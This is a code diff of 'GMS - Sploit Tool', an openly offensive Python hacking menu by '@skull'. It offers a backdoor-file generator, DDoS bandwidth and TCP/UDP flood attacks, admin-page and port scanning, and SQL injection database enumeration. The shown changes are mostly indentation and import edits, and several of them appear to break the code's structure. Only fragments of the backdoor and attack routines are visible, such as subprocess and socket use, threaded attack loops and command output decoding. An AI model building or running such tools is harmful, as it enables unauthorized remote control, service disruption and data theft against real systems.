@@ -1,8 +1,11 @@
 try:
    import colorama 
-   from colorama import Fore 
+   from colorama import Fore , init 
    from colorama import Style 
- from colorama import Back 
+   from colorama import Back
+   from colorama import init, Fore, Back, Style
+   init(autoreset=True)
+   
 except:
     print("[+] Please Setup Tool\npython3 setup.py")
 import os 
@@ -10,12 +13,12 @@ try:
  import requests 
 except:
     print("[+] Please Setup Tool\npython3 setup.py")
- import random 
- import socket 
- import sys 
- import subprocess 
- import re 
- import threading 
+    import random 
+    import socket 
+    import sys 
+    import subprocess 
+    import re 
+    import threading 
 try:
    import aiohttp 
    import asyncio 
@@ -27,11 +30,11 @@ except:
     print("[+] Please Setup Tool\npython3 setup.py")
     
   
- os.system('cls' if os.name == 'nt' else 'clear') 
+    os.system('cls' if os.name == 'nt' else 'clear') 
   
- print(f''' 
- {Fore.RED}GMS - Sploit Tool 
- {Fore.RED}Dev By : @skull{Style.RESET_ALL} 
+    print(f''' 
+    {Fore.RED}GMS - Sploit Tool 
+    {Fore.RED}Dev By : @skull{Style.RESET_ALL} 
                              ,-.                                
         ___,---.__          /' `\          __,---,___           
      ,-'    \`    `-.____,-'     `-.____,-'    //    `-.        
@@ -45,29 +48,29 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
    {Style.RESET_ALL} 
   
       =[ GMS v1.4-dev                  ]=- 
- +-- -=[ Copyright By {Fore.BLUE}SKULLBOX{Style.RESET_ALL}        ]=- 
- +-- -=[ Twitter : {Back.GREEN}@HKGATO{Style.RESET_ALL}       ]=- 
- +-- -=[ Email : supportumbrella@gmail.com   ]=- 
+  +-- -=[ Copyright By {Fore.BLUE}SKULLBOX{Style.RESET_ALL}        ]=- 
+  +-- -=[ Twitter : {Back.GREEN}@HKGATO{Style.RESET_ALL}       ]=- 
+  +-- -=[ Email : supportumbrella@gmail.com   ]=- 
   
- DMS document : https://m7hk.blogger.ml
+  DMS document : https://m7hk.blogger.ml
  N/A''') 
- print(f''' 
- {Fore.WHITE}{Back.RED}Warning Cyber Secutity !! {Style.RESET_ALL} 
- [-] ALL METHOD(s) : 
- +-- -=[ 1 Malware Method              ] 
- +-- -=[ 2 Stresser DDoS Attack Method ] 
- +-- -=[ 3 Exploit - Scan Vulnerable   ] 
- +-- -=[ 2 Scan Information Target     ] 
- {Fore.BLUE}[*]{Style.RESET_ALL} Please use according to the provisions of Law 
- --- 
- method : 
+    print(f''' 
+  {Fore.WHITE}{Back.RED}Warning Cyber Secutity !! {Style.RESET_ALL} 
+  [-] ALL METHOD(s) : 
+  +-- -=[ 1 Malware Method              ] 
+  +-- -=[ 2 Stresser DDoS Attack Method ] 
+  +-- -=[ 3 Exploit - Scan Vulnerable   ] 
+  +-- -=[ 2 Scan Information Target     ] 
+  {Fore.BLUE}[*]{Style.RESET_ALL} Please use according to the provisions of Law 
+  --- 
+  method : 
      1), Backdoor Created ({Fore.RED + Style.BRIGHT}WARNING MALWARE{Style.RESET_ALL})  
      2), Attack the server's bandwidth is overloaded ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL}) 
      3), DDoS attack TCP, UDP Attack ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL}) 
@@ -76,12 +79,12 @@ except:
      6), Scan Page Login Admin ({Fore.GREEN + Style.BRIGHT}BASIC HACKING{Style.RESET_ALL}) 
      7), Checking PORT server address ({Fore.GREEN + Style.BRIGHT}BASIC HACKING{Style.RESET_ALL})    
      8), Injection Command MySQL - Enumerate Database SQLi ({Fore.RED + Style.BRIGHT}WARNING SECURITY{Style.RESET_ALL})  
- --- 
+  --- 
  ''')
   
- choose = input("choose method : ") 
+    choose = input("choose method : ") 
   
- if choose == "1": 
+    if choose == "1": 
      import os 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f'''{Fore.RED} 
@@ -98,12 +101,12 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+   hkm7      /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
    {Style.RESET_ALL}
- ''') 
+  ''') 
      def backdoor(): 
          import socket 
          import sys 
@@ -119,7 +122,7 @@ except:
          NAME_FILE = input("set FILE NAME : ") 
          print(f"{Fore.BLUE}[*]{Style.RESET_ALL} FILE NAME => {NAME_FILE}") 
          print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Starting Created File {NAME_FILE}") 
-         code = f''' 
+         code = (f''' 
  import socket 
  import random 
  import subprocess 
@@ -151,7 +154,7 @@ except:
              data = random.randint(1111111111, 9999999999) 
              print("[-] Starting Setup", data) 
  setup() 
- ''' 
+ ''') 
          with open(f'{NAME_FILE}.py', 'w') as files: 
              content = files.write(code) 
              print(f'{Fore.BLUE}[*]{Style.RESET_ALL} Created Success {content}') 
@@ -180,7 +183,7 @@ except:
                  print("\n" + output.decode()) 
   
      backdoor() 
- elif choose == "2": 
+    elif choose == "2": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(''' 
                              ,-.                                
@@ -226,7 +229,7 @@ except:
                  loop.run_until_complete(main()) 
   
      exploit() 
- elif choose == "3": 
+    elif choose == "3": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f'''{Fore.RED}{Style.BRIGHT} 
                              ,-.                                
@@ -267,7 +270,7 @@ except:
              t.start() 
              t.join() 
      attack() 
- elif choose == "4": 
+    elif choose == "4": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f''' 
                              ,-.                                
@@ -283,7 +286,7 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
@@ -307,7 +310,7 @@ except:
              exit() 
      exploit() 
   
- elif choose == "5": 
+    elif choose == "5": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f'''{Fore.RED} 
                              ,-.                                
@@ -323,7 +326,7 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
@@ -344,7 +347,7 @@ except:
              exit() 
      exploit() 
   
- elif choose == "6": 
+    elif choose == "6": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f'''{Fore.RED}{Style.BRIGHT} 
                              ,-.                                
@@ -360,7 +363,7 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
@@ -405,7 +408,7 @@ except:
              else: 
                  print(f"{Fore.RED}[*]{Style.RESET_ALL} Not Found Page : {log_page}") 
      exploit() 
- elif choose == "7": 
+    elif choose == "7": 
      os.system('cls' if os.name == 'nt' else 'clear') 
      print(f'''{Fore.BLUE} 
                              ,-.                                
@@ -421,7 +424,7 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
@@ -461,10 +464,10 @@ except:
              else: 
                  pass 
      exploit() 
- elif choose == "8": 
+    elif choose == "8": 
      os.system('cls' if os.name == 'nt' else ' clear') 
      print(''' 
- Adonis Bertha 
+
                               ,-.                                
         ___,---.__          /' `\          __,---,___           
      ,-'    \`    `-.____,-'     `-.____,-'    //    `-.        
@@ -478,7 +481,7 @@ except:
       ``       /     \    ,='/ \`=.    /     \       ''           
               |__   /|\_,--.,-.--,--._/|\   __|                   
               /  `./  \\`\ |  |  | /,//' \,'  \                   
- hkm7       /   /     ||          /-|     \   \                  
+  hkm7       /   /     ||          /-|     \   \                  
             |   |     /'\_\_\ | /_/_/`\     |   |                 
              \   \__, \_     `~'     _/ .__/   /             
               `-._,-'   `-._______,-'   `-._,-' 
@@ -718,6 +721,6 @@ except:
                    else: 
                      print("not found {}".format(xem)) 
      exploit() 
- else: 
+    else: 
      print(f"{Fore.WHITE}{Back.RED}[FAILED]{Style.RESET_ALL} Not Found Number Method , Please Again..") 
      pass
